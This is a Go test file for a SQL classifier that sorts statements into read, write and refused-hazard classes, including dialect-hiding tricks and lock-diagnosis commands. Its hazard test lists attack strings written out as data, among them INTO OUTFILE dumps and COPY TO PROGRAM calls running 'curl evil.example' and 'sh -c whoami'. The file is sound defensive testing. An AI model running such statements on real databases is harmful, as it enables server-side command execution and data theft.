package sqlcore

import "testing"

// Dialect-aware stripping: writes hidden by dollar-quotes / mysql hints must not
// slip past Classify, and pseudo-read hazards inside them must still register.
func TestClassify_DialectStripping(t *testing.T) {
	cases := []struct {
		sql  string
		want Class
	}{
		// pg dollar-quoted body is a literal → its keywords are NOT code.
		{"SELECT $$ INSERT INTO t $$ AS note", ClassRead},
		{"SELECT $tag$ DROP TABLE x $tag$ AS s", ClassRead},
		// a $1 positional parameter is not a dollar-quote opener.
		{"SELECT * FROM t WHERE id = $1", ClassRead},
		// mysql executable comment body IS code → the hazard is visible and refused.
		{"SELECT 1 /*!40001 INTO OUTFILE '/tmp/x' */", ClassHazard},
		{"SELECT /*+ SOME_HINT */ * FROM t", ClassRead},
		// regular block comment is dead.
		{"SELECT 1 /* DELETE FROM t */", ClassRead},
		// unterminated literal: rest is blanked → reads as a (malformed) SELECT,
		// which the engine itself rejects; no hidden write survives.
		{"SELECT 'oops) INSERT INTO t VALUES(1)", ClassRead},
		// leading paren still a read.
		{"(SELECT 1)", ClassRead},
	}
	for _, c := range cases {
		if got := Classify(c.sql); got != c.want {
			t.Errorf("Classify(%q) = %v, want %v", c.sql, got, c.want)
		}
	}
}

// Ops / lock-diagnosis commands must classify correctly: viewing is a read,
// killing a session is a write (gated by --allow-write), never DDL-refused.
func TestClassify_OpsCommands(t *testing.T) {
	cases := []struct {
		sql  string
		want Class
	}{
		{"SHOW PROCESSLIST", ClassRead},
		{"SHOW ENGINE INNODB STATUS", ClassRead},
		{"SELECT * FROM information_schema.innodb_lock_waits", ClassRead},
		{"SELECT pid, state FROM pg_stat_activity", ClassRead},
		{"KILL 1542", ClassWrite},
		{"KILL QUERY 1542", ClassWrite},
		{"SELECT pg_cancel_backend(48213)", ClassWrite},
		{"SELECT pg_terminate_backend(48213)", ClassWrite},
	}
	for _, c := range cases {
		if got := Classify(c.sql); got != c.want {
			t.Errorf("Classify(%q) = %v, want %v", c.sql, got, c.want)
		}
	}
}

// Server-side file-write / command-exec primitives are their own refuse tier:
// refused unconditionally (like DDL), never merely a --allow-write write.
func TestClassify_HazardRefused(t *testing.T) {
	hazards := []string{
		"SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'",
		"SELECT * FROM users INTO DUMPFILE '/tmp/dump.bin'",
		"select a, b from t into outfile '/tmp/x'", // case-insensitive
		"COPY (SELECT 1) TO PROGRAM 'curl evil.example'",
		"COPY t TO PROGRAM 'sh -c whoami'",
	}
	for _, sql := range hazards {
		if got := Classify(sql); got != ClassHazard {
			t.Errorf("Classify(%q) = %v, want ClassHazard", sql, got)
		}
	}
	// The literal 'INTO OUTFILE' inside a string is dead → not a hazard.
	if got := Classify("SELECT 'INTO OUTFILE' AS note"); got != ClassRead {
		t.Errorf("literal INTO OUTFILE must not be a hazard, got %v", got)
	}
	// A plain COPY (import) without TO PROGRAM stays a normal write.
	if got := Classify("COPY t FROM STDIN"); got != ClassWrite {
		t.Errorf("plain COPY FROM = %v, want ClassWrite", got)
	}
}

// stripLiterals must be length-preserving so auto-LIMIT byte offsets stay valid.
func TestStripLiterals_LengthPreserving(t *testing.T) {
	in := "SELECT 'a long literal value' FROM t LIMIT 5"
	got := stripLiterals(in)
	if len(got) != len(in) {
		t.Fatalf("length changed: in=%d out=%d", len(in), len(got))
	}
	// the literal span is blanked, LIMIT stays visible at its original offset.
	if got[7] != ' ' { // first char inside the quote region
		t.Errorf("literal not blanked: %q", got)
	}
}
